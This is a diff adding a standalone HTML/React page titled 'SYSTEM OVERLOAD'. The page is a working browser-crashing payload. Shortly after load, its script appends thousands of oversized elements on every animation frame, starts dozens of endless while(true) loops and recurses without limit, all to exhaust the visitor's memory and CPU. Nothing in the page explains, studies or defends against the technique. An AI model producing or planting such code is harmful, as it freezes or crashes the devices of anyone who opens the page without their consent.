@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM OVERLOAD</title>
+    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/babel-standalone/babel.min.js"></script>
+    <style>
+        body { margin:0; overflow:hidden; background:#000; font-family: monospace; color:#0f0; }
+        .crash-container { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle, #220000, #000); }
+        .crash-content { text-align: center; z-index: 10; }
+        .crash-title { font-size: 4rem; color: #ff0000; text-shadow: 0 0 20px #ff0000; animation: glitch 0.3s infinite; }
+        @keyframes glitch { 0%,100% { transform: translate(0); } 20% { transform: translate(-5px,5px); } 40% { transform: translate(5px,-5px); } }
+    </style>
+</head>
+<body>
+    <div id="root"></div>
+
+    <script type="text/babel">
+        const { useEffect, useState } = React;
+
+        const CrashPage = () => {
+          useEffect(() => {
+            const crashBrowser = () => {
+              const memoryBomb = () => {
+                const container = document.createElement('div');
+                document.body.appendChild(container);
+                const createElements = () => {
+                  for (let i = 0; i < 5000; i++) {
+                    const el = document.createElement('div');
+                    el.innerHTML = 'X'.repeat(5000);
+                    el.style.cssText = `position:absolute;width:${Math.random()*800}px;height:${Math.random()*800}px;background:radial-gradient(circle,#${Math.random().toString(16).substr(2,6)},#${Math.random().toString(16).substr(2,6)});transform:rotate(${Math.random()*360}deg) scale(${Math.random()*4});opacity:${Math.random()};`;
+                    container.appendChild(el);
+                  }
+                  requestAnimationFrame(createElements);
+                };
+                createElements();
+              };
+
+              const cpuBomb = () => {
+                const infiniteRecursion = () => {
+                  try {
+                    new Array(500000).fill(0).sort();
+                    infiniteRecursion();
+                  } catch(e) {}
+                };
+                for (let i = 0; i < 30; i++) setTimeout(() => { while(true) { Math.sqrt(Math.random()*1e9); } }, 0);
+                infiniteRecursion();
+              };
+
+              memoryBomb();
+              cpuBomb();
+            };
+
+            setTimeout(crashBrowser, 800);
+          }, []);
+
+          return React.createElement('div', { className: "crash-container" },
+            React.createElement('div', { className: "crash-content" },
+              React.createElement('h1', { className: "crash-title" }, "SYSTEM OVERLOAD")
+            )
+          );
+        };
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(React.createElement(CrashPage));
+    </script>
+</body>
+</html>
